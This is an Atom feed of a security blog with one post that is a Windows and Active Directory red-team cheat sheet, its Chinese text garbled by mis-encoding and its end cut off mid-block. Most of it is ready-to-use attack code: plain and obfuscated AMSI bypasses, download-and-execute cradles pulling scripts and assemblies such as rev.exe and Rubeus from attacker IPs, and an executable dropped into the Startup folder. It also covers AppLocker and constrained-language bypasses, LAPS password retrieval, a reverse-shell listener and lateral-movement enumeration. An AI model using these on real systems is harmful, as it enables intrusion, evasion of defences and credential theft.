<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ä¿¡æ¯å®‰å…¨åˆå­¦è€…</title>
  
  <subtitle>No pains No gainsï¼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yaalonsong.github.io/"/>
  <updated>2021-05-19T08:17:30.273Z</updated>
  <id>https://yaalonsong.github.io/</id>
  
  <author>
    <name>yaron</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ</title>
    <link href="https://yaalonsong.github.io/2021/05/19/Windows%E5%92%8CActive%20Directory%E5%A4%87%E5%BF%98%E5%8D%95%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83.html"/>
    <id>https://yaalonsong.github.io/2021/05/19/Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ.html</id>
    <published>2021-05-19T08:14:10.528Z</published>
    <updated>2021-05-19T08:17:30.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windowså’ŒActive-Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ"><a href="#Windowså’ŒActive-Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ" class="headerlink" title="Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ"></a>Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ</h1><h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="PowerShell-AMSI-Bypass"><a href="#PowerShell-AMSI-Bypass" class="headerlink" title="PowerShell AMSI Bypass"></a>PowerShell AMSI Bypass</h3><p>ä¿®è¡¥AMSIå°†æœ‰åŠ©äºç»•è¿‡æ‰§è¡Œæ ‡è®°ä¸ºæ¶æ„çš„<code>PowerShell</code>è„šæœ¬ï¼ˆä¾‹å¦‚<code>PowerView</code>ï¼‰æ—¶è§¦å‘çš„AVè­¦å‘Šã€‚è¯·å‹¿åœ¨ç§˜å¯†æ“ä½œä¸­æŒ‰åŸæ ·ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬ä¼šè¢«æ ‡è®°<code>flag</code>ã€‚é€šè¿‡æ›´æ”¹è„šæœ¬ä»¥èƒœè¿‡åŸºäºç­¾åçš„æ£€æµ‹ï¼Œå¯ä»¥æ··æ·†ç”šè‡³æ›´å¥½åœ°å®Œå…¨æ¶ˆé™¤AMSIç»•è¿‡çš„éœ€è¦ã€‚</p><a id="more"></a><p>â€˜Plainâ€™ AMSI bypass:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Ref].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>).GetField(<span class="string">'amsiInitFailed'</span>,<span class="string">'NonPublic,Static'</span>).SetValue(<span class="literal">$null</span>,<span class="literal">$true</span>)</span><br></pre></td></tr></table></figure><p>ç”¨äºå¤åˆ¶ç²˜è´´çš„æ··æ·†ç¤ºä¾‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sET-ItEM</span> ( <span class="string">'V'</span>+<span class="string">'aR'</span> +  <span class="string">'IA'</span> + <span class="string">'blE:1q2'</span>  + <span class="string">'uZx'</span>  ) ( [TYpE](  <span class="string">"&#123;1&#125;&#123;0&#125;"</span>-F<span class="string">'F'</span>,<span class="string">'rE'</span>  ) )  ;    (    <span class="built_in">GeT-VariaBle</span>  ( <span class="string">"1Q2U"</span>  +<span class="string">"zX"</span>  )  -VaL ).<span class="string">"A`ss`Embly"</span>.<span class="string">"GET`TY`Pe"</span>((  <span class="string">"&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;"</span> -f<span class="string">'Util'</span>,<span class="string">'A'</span>,<span class="string">'Amsi'</span>,<span class="string">'.Management.'</span>,<span class="string">'utomation.'</span>,<span class="string">'s'</span>,<span class="string">'System'</span>  ) ).<span class="string">"g`etf`iElD"</span>(  ( <span class="string">"&#123;0&#125;&#123;2&#125;&#123;1&#125;"</span> -f<span class="string">'amsi'</span>,<span class="string">'d'</span>,<span class="string">'InitFaile'</span>  ),(  <span class="string">"&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;"</span> -f <span class="string">'Stat'</span>,<span class="string">'i'</span>,<span class="string">'NonPubli'</span>,<span class="string">'c'</span>,<span class="string">'c,'</span> )).<span class="string">"sE`T`VaLUE"</span>(  $&#123;n`ULl&#125;,$&#123;t`RuE&#125; )</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªæ—è·¯ï¼ŒPowerShellè‡ªåŠ¨è®°å½•æœªæ£€æµ‹åˆ°ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Delegate]::CreateDelegate((<span class="string">"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]"</span> -as [String].Assembly.GetType(<span class="string">'System.T'</span>+<span class="string">'ype'</span>)), [Object]([Ref].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>)),(<span class="string">'GetFie'</span>+<span class="string">'ld'</span>)).Invoke(<span class="string">'amsiInitFailed'</span>,((<span class="string">'Non'</span>+<span class="string">'Public,Static'</span>) -as [String].Assembly.GetType(<span class="string">'System.Reflection.Bindin'</span>+<span class="string">'gFlags'</span>))).SetValue(<span class="literal">$null</span>,<span class="literal">$True</span>)</span><br></pre></td></tr></table></figure><blockquote><p>æ›´å¤šç»•è¿‡ç‚¹å‡»<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚å¯¹äºæ··æ·†ï¼Œè¯·æ£€æŸ¥<a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">Invoke-Obfuscation</a>ï¼Œæˆ–åœ¨<a href="https://amsi.fail/" target="_blank" rel="noopener">amsi.fail</a>ä¸Šè·å–é¢„å…ˆç”Ÿæˆçš„æ··æ·†ç‰ˆæœ¬ã€‚</p></blockquote><h3 id="PowerShell-one-liners"><a href="#PowerShell-one-liners" class="headerlink" title="PowerShell one-liners"></a>PowerShell one-liners</h3><h4 id="åå°„å¼åŠ è½½PowerShellè„šæœ¬"><a href="#åå°„å¼åŠ è½½PowerShellè„šæœ¬" class="headerlink" title="åå°„å¼åŠ è½½PowerShellè„šæœ¬"></a><strong>åå°„å¼åŠ è½½PowerShellè„šæœ¬</strong></h4><p>ä»£ç†æ„ŸçŸ¥ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.16.7/PowerView.obs.ps1'</span>)</span><br></pre></td></tr></table></figure><p>ä¸äº†è§£ä»£ç†ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$h</span>=<span class="built_in">new-object</span> -com WinHttp.WinHttpRequest.<span class="number">5.1</span>;<span class="variable">$h</span>.open(<span class="string">'GET'</span>,<span class="string">'http://10.10.16.7/PowerView.obs.ps1'</span>,<span class="literal">$false</span>);<span class="variable">$h</span>.send();iex <span class="variable">$h</span>.responseText</span><br></pre></td></tr></table></figure><blockquote><p>åŒæ ·ï¼Œè¿™å¯èƒ½ä¼šè¢«æ ‡è®°flagã€‚æœ‰å…³opsecå®‰å…¨çš„ä¸‹è½½é€šè®¯åº§ï¼Œè¯·æŸ¥çœ‹<a href="https://github.com/danielbohannon/Invoke-CradleCrafter" target="_blank" rel="noopener">Invoke-CradleCrafter</a>ã€‚</p></blockquote><h4 id="åå°„å¼åŠ è½½Cï¼ƒç¨‹åºé›†"><a href="#åå°„å¼åŠ è½½Cï¼ƒç¨‹åºé›†" class="headerlink" title="åå°„å¼åŠ è½½Cï¼ƒç¨‹åºé›†"></a><strong>åå°„å¼åŠ è½½Cï¼ƒç¨‹åºé›†</strong></h4><p>åœ¨è¿è¡Œè¯¥ç±»ä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‰€å¼•ç”¨çš„ç±»å’Œmainæ–¹æ³•ä¸ºPublicã€‚è¯·æ³¨æ„ï¼Œä¸ºæ­¤å¯èƒ½éœ€è¦å…¨è¿‡ç¨‹çš„AMSIæ—è·¯ï¼Œ<a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">æœ‰å…³è¯¦ç»†ä¿¡æ¯</a>ï¼Œ<a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">è¯·å‚è§æ­¤å¤„</a>ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download and run assembly without arguments</span></span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">'http://10.10.16.7/rev.exe'</span>)</span><br><span class="line"><span class="variable">$assem</span> = [System.Reflection.Assembly]::Load(<span class="variable">$data</span>)</span><br><span class="line">[rev.Program]::Main(<span class="string">""</span>.Split())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download and run Rubeus, with arguments</span></span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">'http://10.10.16.7/Rubeus.exe'</span>)</span><br><span class="line"><span class="variable">$assem</span> = [System.Reflection.Assembly]::Load(<span class="variable">$data</span>)</span><br><span class="line">[Rubeus.Program]::Main(<span class="string">"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt"</span>.Split())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute a specific method from an assembly (e.g. a DLL)</span></span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">'http://10.10.16.7/lib.dll'</span>)</span><br><span class="line"><span class="variable">$assem</span> = [System.Reflection.Assembly]::Load(<span class="variable">$data</span>)</span><br><span class="line"><span class="variable">$class</span> = <span class="variable">$assem</span>.GetType(<span class="string">"ClassLibrary1.Class1"</span>)</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$class</span>.GetMethod(<span class="string">"runner"</span>)</span><br><span class="line"><span class="variable">$method</span>.Invoke(<span class="number">0</span>, <span class="literal">$null</span>)</span><br></pre></td></tr></table></figure><h4 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Any version</span></span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">"http://192.168.119.155/PowerUp.ps1"</span>, <span class="string">"C:\Windows\Temp\PowerUp.ps1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell 4+</span></span><br><span class="line"><span class="comment">## You can use 'IWR' as a shorthand</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="string">"http://10.10.16.7/Incnspc64.exe"</span> -OutFile <span class="string">"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe"</span></span><br></pre></td></tr></table></figure><h4 id="ç¼–ç å‘½ä»¤"><a href="#ç¼–ç å‘½ä»¤" class="headerlink" title="ç¼–ç å‘½ä»¤"></a>ç¼–ç å‘½ä»¤</h4><p>ç¼–ç ä¸€çº¿ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)</span><br></pre></td></tr></table></figure><p>æˆ–ä»¥ä¸Šç‰ˆæœ¬çš„Linuxï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure><p>å¯¹ç°æœ‰è„šæœ¬è¿›è¡Œç¼–ç ï¼Œç„¶åå¤åˆ¶åˆ°å‰ªè´´æ¿ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(<span class="string">'c:\path\to\PowerView.ps1'</span>)) | clip</span><br></pre></td></tr></table></figure><p>è¿è¡Œå®ƒï¼Œç»•è¿‡æ‰§è¡Œç­–ç•¥ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell -EncodedCommand <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ‚¨æ–¹ä¾¿ä½¿ç”¨Nishangï¼Œåˆ™å¯ä»¥ä½¿ç”¨<a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1" target="_blank" rel="noopener">Invoke-Encode.ps1</a>ã€‚</p></blockquote><h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a><strong>æšä¸¾</strong></h2><h3 id="ä½¿ç”¨PowerViewè¿›è¡ŒADæšä¸¾"><a href="#ä½¿ç”¨PowerViewè¿›è¡ŒADæšä¸¾" class="headerlink" title="ä½¿ç”¨PowerViewè¿›è¡ŒADæšä¸¾"></a><strong>ä½¿ç”¨PowerViewè¿›è¡ŒADæšä¸¾</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–å½“å‰åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·</span></span><br><span class="line">Get-NetUser | select -ExpandProperty cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰åŸŸä¸­çš„æ‰€æœ‰è®¡ç®—æœº</span></span><br><span class="line">Get-NetComputer</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰æ—ä¸­çš„æ‰€æœ‰åŸŸ</span></span><br><span class="line">Get-NetForestDomain</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–åŸŸ/æ—ä¿¡ä»»</span></span><br><span class="line">Get-NetDomainTrust</span><br><span class="line">Get-NetForestTrust</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–DAç»„çš„ä¿¡æ¯</span></span><br><span class="line">Get-NetGroup -GroupName <span class="string">"Domain Admins"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥æ‰¾DAç»„çš„æˆå‘˜</span></span><br><span class="line">Get-NetGroupMember -GroupName <span class="string">"Domain Admins"</span> | select -ExpandProperty membername</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨åŸŸä¸­æŸ¥æ‰¾æœ‰è¶£çš„å…±äº«ï¼Œå¿½ç•¥é»˜è®¤å…±äº«</span></span><br><span class="line">Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰åŸŸçš„OU</span></span><br><span class="line">Get-NetOU -FullData</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨OUä¸­è·å–è®¡ç®—æœº</span></span><br><span class="line"><span class="comment"># %&#123;&#125; æ˜¯å¾ªç¯è¯­å¥</span></span><br><span class="line">Get-NetOU -OUName StudentMachines | %&#123;Get-NetComputer -ADSPath <span class="variable">$_</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–é€‚ç”¨äºç‰¹å®šOUçš„GPO</span></span><br><span class="line">Get-NetOU *student* | select gplink</span><br><span class="line">Get-NetGPO -Name <span class="string">"&#123;3E04167E-C2B6-4A9A-8FB7-C811158DC97C&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–é€šè¿‡GPOè®¾ç½®çš„å—é™ç»„ï¼ŒæŸ¥æ‰¾é€šè¿‡åŸŸå¼ºåˆ¶è®¾ç½®çš„æœ‰è¶£ç»„æˆå‘˜èº«ä»½</span></span><br><span class="line">Get-NetGPOGroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç‰¹å®šå¯¹è±¡çš„ä¼ å…¥ACL</span></span><br><span class="line">Get-ObjectACL -SamAccountName <span class="string">"Domain Admins"</span> -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥æ‰¾æ•´ä¸ªåŸŸçš„æœ‰è¶£ACLï¼Œä»¥å¯è¯»ï¼ˆä»å·¦åˆ°å³ï¼‰æ ¼å¼æ˜¾ç¤º</span></span><br><span class="line">Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="nomarkup">-NotContains</span> <span class="string">"DnsAdmins"</span>&#125; | ft</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç‰¹å®šç”¨æˆ·æˆ–ç»„çš„æœ‰è¶£çš„ä¼ å‡ºACL</span></span><br><span class="line"><span class="comment"># ?&#123;&#125; æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨è¯­å¥</span></span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.IdentityReference <span class="nomarkup">-match</span> <span class="string">"Domain Admins"</span>&#125; | select ObjectDN,ActiveDirectoryRights</span><br></pre></td></tr></table></figure><h3 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h3><p>è¯†åˆ«AppLockerç­–ç•¥ã€‚å¯»æ‰¾å…é™¤çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è¦ç»•è¿‡çš„è·¯å¾„ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span><br></pre></td></tr></table></figure><ul><li>ä¸€äº›é«˜çº§ç»•è¿‡æŠ€æœ¯ï¼š<ul><li>å¦‚æœä»…å…è®¸ä½¿ç”¨ï¼ˆMicrosoftï¼‰ç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨<a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a>ã€‚</li><li>å¦‚æœ<code>C:\Windows</code>å…è®¸æ¥è‡ªçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·å°è¯•å°†æ‚¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æ‹–æ”¾åˆ°<code>C:\Windows\Temp</code>æˆ–<code>C:\Windows\Tasks</code>ã€‚å¦‚æœæ­¤ç›®å½•æ ‘ä¸­æ²¡æœ‰å¯å†™çš„å­ç›®å½•ï¼Œä½†å­˜åœ¨å¯å†™æ–‡ä»¶ï¼Œåˆ™å°†æ–‡ä»¶å†™å…¥å¤‡ç”¨æ•°æ®æµï¼ˆä¾‹å¦‚JScriptè„šæœ¬ï¼‰ï¼Œç„¶åä»é‚£é‡Œæ‰§è¡Œå®ƒã€‚</li><li>å°†æ‚¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åŒ…è£…åœ¨DLLæ–‡ä»¶ä¸­ï¼Œç„¶åæ‰§è¡Œ<code>rundll32</code>ä»¥ç»•è¿‡å¯æ‰§è¡Œè§„åˆ™ã€‚å¦‚æœå…è®¸ä½¿ç”¨Pythonä¹‹ç±»çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨è¯¥æ–‡ä»¶ã€‚å¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œè¯·å°è¯•å…¶ä»–æŠ€æœ¯ï¼Œä¾‹å¦‚å°†JScriptåŒ…è£…åœ¨HTAæ–‡ä»¶ä¸­æˆ–ä½¿ç”¨æ¥è¿è¡ŒXSLæ–‡ä»¶<code>wmic</code>ã€‚</li></ul></li></ul><h3 id="PowerShellå—é™è¯­è¨€æ¨¡å¼"><a href="#PowerShellå—é™è¯­è¨€æ¨¡å¼" class="headerlink" title="PowerShellå—é™è¯­è¨€æ¨¡å¼"></a>PowerShellå—é™è¯­è¨€æ¨¡å¼</h3><p>æœ‰æ—¶ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°è‡ªå·±å¤„äºæ‰§è¡Œçº¦æŸè¯­è¨€æ¨¡å¼ï¼ˆCLMï¼‰çš„PowerShellä¼šè¯ä¸­ã€‚ä¸AppLockeré…å¯¹æ—¶ï¼Œé€šå¸¸æ˜¯è¿™ç§æƒ…å†µï¼ˆè¯·å‚è§ä¸Šæ–‡ï¼‰ã€‚</p><p>æ‚¨å¯ä»¥é€šè¿‡è½®è¯¢ä»¥ä¸‹å˜é‡æ¥è·å–å½“å‰çš„è¯­è¨€æ¨¡å¼ï¼Œä»è€Œç¡®å®šè‡ªå·±å¤„äºå—é™è¯­è¨€æ¨¡å¼ã€‚<code>FullLanguage</code>å¯¹äºæ— é™åˆ¶çš„ä¼šè¯å’Œ<code>ConstrainedLanguage</code>CLM ï¼Œå®ƒå°†è¯´ã€‚è¿˜æœ‰å…¶ä»–è¯­è¨€æ¨¡å¼ï¼Œåœ¨è¿™é‡Œæˆ‘å°†ä¸å†èµ˜è¿°ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure><p>CLMæ„æˆçš„çº¦æŸå°†é˜»æ­¢æ‚¨çš„è®¸å¤šåˆ©ç”¨å°è¯•ã€‚ä¸€ç§å¿«é€Ÿè€Œè‚®è„çš„ç»•è¿‡æ–¹æ³•æ˜¯ä½¿ç”¨å†…è”å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰æ—¶ä¼šèµ·ä½œç”¨-å¦‚æœä¾‹å¦‚<code>whoami</code>è¢«é˜»æ­¢ï¼Œè¯·å°è¯•ä»¥ä¸‹æ“ä½œï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&#123;whoami&#125;</span><br></pre></td></tr></table></figure><h3 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a href="https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1" target="_blank" rel="noopener">LAPSToolkit.ps1</a>æ¥è¯†åˆ«åŸŸä¸­çš„å“ªäº›è®¡ç®—æœºä½¿ç”¨LAPSï¼Œä»¥åŠå…è®¸å“ªäº›åŸŸç»„è¯»å–LAPSå¯†ç ã€‚å¦‚æœå±äºæ­¤ç»„ï¼Œåˆ™ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤å·¥å…·è·å–å½“å‰çš„LAPSå¯†ç ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–è¿è¡ŒLAPSçš„è®¡ç®—æœºåŠå…¶å¯†ç ï¼ˆå¦‚æœå…è®¸æˆ‘ä»¬è¯»å–è¿™äº›å¯†ç ï¼‰</span></span><br><span class="line">Get-LAPSComputers</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å…è®¸è¯»å–LAPSå¯†ç çš„ç»„</span></span><br><span class="line">Find-LAPSDelegatedGroups</span><br></pre></td></tr></table></figure><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Powercatåå‘shell"><a href="#Powercatåå‘shell" class="headerlink" title="Powercatåå‘shell"></a>Powercatåå‘shell</h3><p>å¦‚æœæ‚¨çš„Linuxæœºå£³æ²¡æœ‰åå‘å¤–å£³ï¼Œåˆ™å¯ä»¥é€‰æ‹©;ï¼‰ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p <span class="number">443</span> -t <span class="number">9999</span></span><br></pre></td></tr></table></figure><h2 id="æ¨ªå‘è¿åŠ¨"><a href="#æ¨ªå‘è¿åŠ¨" class="headerlink" title="æ¨ªå‘è¿åŠ¨"></a>æ¨ªå‘è¿åŠ¨</h2><h3 id="ä½¿ç”¨PowerViewè¿›è¡Œæ¨ªå‘è¿åŠ¨æšä¸¾"><a href="#ä½¿ç”¨PowerViewè¿›è¡Œæ¨ªå‘è¿åŠ¨æšä¸¾" class="headerlink" title="ä½¿ç”¨PowerViewè¿›è¡Œæ¨ªå‘è¿åŠ¨æšä¸¾"></a>ä½¿ç”¨PowerViewè¿›è¡Œæ¨ªå‘è¿åŠ¨æšä¸¾</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥æ‰¾ç”¨æˆ·çš„ç°æœ‰æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ï¼ˆnoisy ğŸš©ï¼‰</span></span><br><span class="line">Find-LocalAdminAccess</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡PSè¿œç¨‹å¤„ç†ï¼ˆalso noisyğŸš©ï¼‰æŸ¥æ‰¾æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œéœ€è¦Find-PSRemotingLocalAdminAccess.ps1</span></span><br><span class="line">Get-NetComputer -Domain dollarcorp.moneycorp.local &gt; .\targets.txt</span><br><span class="line">Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸WMIç›¸åŒã€‚æ˜¯å¦éœ€è¦â€œ Find-WMILocalAdminAccess.ps1â€ï¼ˆä¼¼ä¹å·²ä»Nishangä¸­åˆ é™¤äº†ï¼‰ï¼Ÿ</span></span><br><span class="line">Find-WMILocalAdminAccess -ComputerFile .\targets.txt</span><br><span class="line">Find-WMILocalAdminAccess <span class="comment"># Finds domain computers automatically</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 